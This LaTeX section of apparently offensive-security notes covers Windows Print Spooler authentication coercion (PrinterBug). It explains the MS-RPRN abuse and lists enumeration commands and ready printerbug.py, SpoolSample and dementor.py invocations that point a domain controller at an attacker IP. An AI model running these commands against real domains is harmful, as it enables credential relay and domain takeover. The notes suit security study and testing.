\section{MS-RPRN PrinterBug and PrintNightmare}
\subsection{Introduction}

What is print spooler service?

Print Spooler (aka “Spooler”) is a service that comes built-in in all Microsoft operating systems. It is enabled by default and runs within the SYSTEM context. This service manages the paper printing jobs.

The Print Spooler service (runs as SYSTEM and is installed by default in Windows servers running Desktop Experience.) accepts print jobs from the computer, makes sure that printer resources are available and schedules the order in which jobs are sent to the print queue for printing.

On domain controllers, the Print Spooler service is also responsible for printer pruning from Active Directory. This job checks if the print server is reachable and the printer is still shared, if not, deletes the printQueue object from AD.

The service implements the print client and print server roles, \href{https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/}{as can be seen in the diagram}.

For the print server role, the Print Spooler service registers RPC endpoints for the print protocols [MS-PAR] [MS-RPRN] [MS-PAN]. The Print Spooler service also exposes local interfaces that extend Internet Information Services (IIS) to support the Internet Printing Protocol (IPP) [RFC8010] [RFC8011] and the Web Point-and-Print Protocol [MS-WPRN] if they are configured to support IPP.


To exploit this vector, an unprivileged attacker in the network can remotely request a domain controller’s Print Spooler service to update an attacker-controlled host on new print jobs, by calling the \verb+RpcRemoteFindFirstPrinterChangeNotificationEx+ API (any domain user can connect to the spool's named pipe with the
\verb+RpcOpenPrinter+ method ).

The domain Controller would then authenticate to the attacker-controlled host, an act that can be abused to impersonate the domain Controller and compromise the domain in case of running on a system with unconstrained Kerberos Delegation. This vector can also be leveraged for some NTLM relay use cases, in case that the victim’s computer account has administrative access on other machines. {\bf Microsoft has classified this behavior as an intended one, by design, and do not plan on fixing it}.


The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with \href{https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient}{WebClient abuse} to elicit incoming authentications made over HTTP.


\subsection{Enum}




\begin{verbatim}
rpcdump.py $TARGET | grep -A 6 "spoolsv"
\end{verbatim}

Powershell \href{https://github.com/vletoux/SpoolerScanner}{SpoolerScanner}


\href{http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment}{Get-SpoolStatus}

\href{https://github.com/NotMedic/NetNTLMtoSilverTicket}{Get-SpoolStatus other version}

\begin{verbatim}
Get-ADComputer `
    -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * |
     select Name | ft -HideTableHeaders > servers.txt

. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
# Or
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
\end{verbatim}

\subsection{Exploit}

\begin{verbatim}
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' <attacker_ip>
\end{verbatim}

To coerce HTTP NTLM authentication on WebDAV-enabled hosts, we use the same syntax; however, for the listener, we will set it as a valid WebDAV connection string, using the format \verb+ATTACKER_MACHINE_NAME@PORT/PATH+

\begin{verbatim}
python3 printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET'  SUPPORTPC@80/print
\end{verbatim}

\begin{itemize}
    \item 
        \verb+ATTACKER_MACHINE_NAME+ must be the NetBIOS or DNS name of the attacker machine because Responder will poison broadcast traffic in any case, we set it to an arbitrary string.
    \item 
        \verb+PORT+ specifies an arbitrary port the WebDAV service will use to connect to the attack machine.
    \item 
        \verb+PATH+ specifies an arbitrary path the WebDAV service will attempt to connect.
\end{itemize}

\href{https://github.com/leechristensen/SpoolSample}{SpoolSample}





attack:
\begin{verbatim}
SpoolSample.exe <TARGET> <RESPONDERIP>

python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
\end{verbatim}

\subsection{links}

\begin{itemize}
    \item \href{https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/}{Demystifying The PrintNightmare Vulnerability}
    
\end{itemize}